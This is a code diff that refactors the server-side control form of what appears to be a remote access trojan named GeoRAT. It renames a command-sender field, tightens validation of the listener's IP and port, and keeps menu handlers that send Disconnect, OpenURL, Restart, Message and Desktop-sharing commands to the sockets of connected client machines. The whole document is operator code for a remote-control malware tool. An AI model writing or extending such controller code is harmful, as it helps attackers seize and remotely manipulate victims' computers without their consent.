@@ -1,7 +1,5 @@
 ﻿
 using System;
-using System.Drawing;
-using System.IO;
 using System.Net.Sockets;
 using System.Windows.Forms;
 using GeoRAT.Server.CommandHandlers;
@@ -9,16 +7,14 @@ using GeoRAT.Server.Net;
 using GeoRAT.Core.Commands;
 using GeoRAT.Core.PacketStruct;
 using GeoRAT.Core.Compressor;
-using GeoRAT.Server.Net.DesktopSharing;
 using Microsoft.VisualBasic;
-using StreamLibrary;
-using StreamLibrary.UnsafeCodecs;
+ 
 
 namespace GeoRAT.Server
 {
     public partial class Form1 : Form
     {
-        private CommandSender Sender;
+        private CommandSender _sender;
         public Form1()
         {
             InitializeComponent();
@@ -27,12 +23,15 @@ namespace GeoRAT.Server
 
         #region Start
 
+
         private void xylosButton1_Click(object sender, EventArgs e)
         {
+            
+            int port;  
             var ip = IpTextBox.Text;
-            int port;
+            
             bool convert = Int32.TryParse(PortTextBox.Text, out  port);
-            if (!convert && string.IsNullOrEmpty(ip) || !convert || string.IsNullOrEmpty(ip))
+            if (!convert && string.IsNullOrEmpty(ip)  || !convert || string.IsNullOrEmpty(ip) || ip.Length < 9) 
             {
                 MessageBox.Show("Enter correct IP and Port!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
@@ -40,13 +39,16 @@ namespace GeoRAT.Server
             else
             {
                 NetworkServer ns = new NetworkServer(ip, port);
-                ns.OnConnected += OnConnectedHandler;
-                ns.Start();
-                MessageBox.Show(ip + ":" + port.ToString(), "Listener started on", MessageBoxButtons.OK,
-                    MessageBoxIcon.Information);
+          
+                 if (ns.ServerSocket.IsBound)
+                    {
+                        ns.OnConnected += OnConnectedHandler;
+                        ns.Start();
+                    }
+                }
+               
             }
-                    
-        }
+ 
 
         #endregion
 
@@ -126,6 +128,7 @@ namespace GeoRAT.Server
                         {
                           i.Remove();
                         }
+                   s.Dispose();
                 }));
 
         }
@@ -139,7 +142,7 @@ namespace GeoRAT.Server
         {
             foreach (ListViewItem i in lvConnections.SelectedItems)
             {
-                Sender = new CommandSender((Socket)i.Tag, new Commands("Disconnect", "'"));
+                _sender = new CommandSender((Socket)i.Tag, new Commands("Disconnect", "'"));
 
             }
         }
@@ -150,7 +153,7 @@ namespace GeoRAT.Server
             var site = Interaction.InputBox("Enter URL:", "Open Website", "http://");
             foreach (ListViewItem i in lvConnections.SelectedItems)
             {
-                Sender = new CommandSender((Socket)i.Tag, new Commands("OpenURL", site));
+                _sender = new CommandSender((Socket)i.Tag, new Commands("OpenURL", site));
             }
         }
 
@@ -159,18 +162,18 @@ namespace GeoRAT.Server
         {
             foreach (ListViewItem i in lvConnections.SelectedItems)
             {
-                Sender = new CommandSender((Socket)i.Tag, new Commands("Restart", "'"));
+                _sender = new CommandSender((Socket)i.Tag, new Commands("Restart", "'"));
 
             }
         }
 
         //Send Message
         private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (ListViewItem i in lvConnections.SelectedItems)
+        {    
+           foreach (ListViewItem i in lvConnections.SelectedItems)
             {
                 var msg = Interaction.InputBox("Enter Message to send", "Messagebox", "Hello");
-                Sender = new CommandSender((Socket)i.Tag, new Commands("Message", msg));
+                _sender = new CommandSender((Socket)i.Tag, new Commands("Message", msg));
             }
         }
 
@@ -178,12 +181,13 @@ namespace GeoRAT.Server
         {
             foreach (ListViewItem i in lvConnections.SelectedItems)
             {
-                Sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
+                _sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
               }
         }
+
+
         #endregion
 
-       
-
+        
     }
 }
